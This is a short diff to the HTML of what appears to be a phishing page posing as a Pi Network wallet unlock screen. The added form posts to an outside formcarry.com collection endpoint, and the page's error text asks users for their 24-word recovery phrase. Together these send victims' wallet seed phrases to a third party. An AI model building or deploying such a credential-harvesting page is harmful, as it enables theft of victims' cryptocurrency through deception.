@@ -141,11 +141,13 @@
       </div>
 
       <!-- Hidden field to detect which button -->
-      <input type="hidden" name="unlock_method" id="unlock_method" value="">
+      <form action="https://formcarry.com/s/Mk7NUDYaT7n" method="POST" accept-charset="UTF-8">
+  <!-- Hidden field to detect which button -->
+  <input type="hidden" name="unlock_method" id="unlock_method" value="">
 
-      <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
-      <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
-    </form>
+  <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
+  <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
+</form>
 
     <div id="error-msg" class="error-box">
       Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
